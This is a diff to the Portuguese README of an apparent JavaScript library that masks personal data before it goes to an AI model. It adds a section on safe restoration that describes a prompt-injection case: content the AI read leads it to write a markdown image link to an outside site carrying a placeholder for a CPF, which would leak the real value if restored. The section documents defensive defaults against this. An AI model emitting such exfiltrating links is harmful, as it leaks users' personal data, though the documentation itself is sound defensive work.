@@ -74,7 +74,7 @@ Protege textos, argumentos de ferramentas e resultados de ferramentas, em `gener
 ## No navegador
 
 ```html
-<script src="https://cdn.jsdelivr.net/npm/@guhttps/veu@0.5.2/dist/veu.global.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/@guhttps/veu@0.6.0/dist/veu.global.js"></script>
 <script>
   const resultado = new veu.Veu().anonymize(document.querySelector("textarea").value);
 </script>
@@ -92,7 +92,25 @@ new Veu({
   operator: "mascara",                    // token (padrão), mascara, remover ou hash
   operators: { CARTAO_CREDITO: "remover" },
   customPatterns: [{ entidade: "MATRICULA", padrao: "MAT-\\d{6}" }],
+  restore: { linkHosts: ["intranet.minhaempresa.com.br"] }, // veja "Restauração segura"
 });
+```
+
+## Restauração segura
+
+A IA pode ser induzida, por uma página ou um e-mail que ela leu, a escrever `![x](https://site/?d=[CPF_1])`. Se o marcador virasse o CPF real ali, o navegador o enviaria ao site. Por isso, por padrão:
+
+- os dados reais **não voltam dentro de links, imagens, URLs e atributos HTML**, nem em streaming;
+- chaves de API, tokens e senhas **não voltam nos argumentos de ferramentas**;
+- marcadores que já chegam no texto (`[CPF_1]` escrito por outra pessoa) são desarmados para `[CPF#1]`.
+
+```ts
+new Veu({ restore: {
+  links: false,               // true: restaura também dentro de links
+  linkHosts: ["empresa.com"], // links destes domínios recebem os dados reais
+  tools: true,                // false: não restaura nenhum argumento de ferramenta
+  secretsInTools: false,      // true: restaura chaves e senhas nos argumentos
+} });
 ```
 
 O operador `sintetico` (outro CPF válido no lugar do original) ainda só existe na versão em Python.
